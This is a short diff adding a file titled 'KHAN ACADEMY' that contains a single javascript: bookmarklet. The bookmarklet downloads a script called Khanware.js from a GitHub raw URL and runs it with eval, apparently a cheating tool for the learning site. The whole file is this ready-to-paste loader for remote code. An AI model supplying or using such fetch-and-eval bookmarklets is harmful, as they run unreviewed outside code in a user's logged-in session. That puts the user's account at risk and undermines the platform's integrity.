@@ -1,0 +1,7 @@
+KHAN ACADEMY 
+
+javascript:fetch("https://raw.
+githubusercontent.com/Niximkk/
+Khanware/refs/heads/main/Khanw
+are.js").then(t=>t.text()).the
+n(eval);
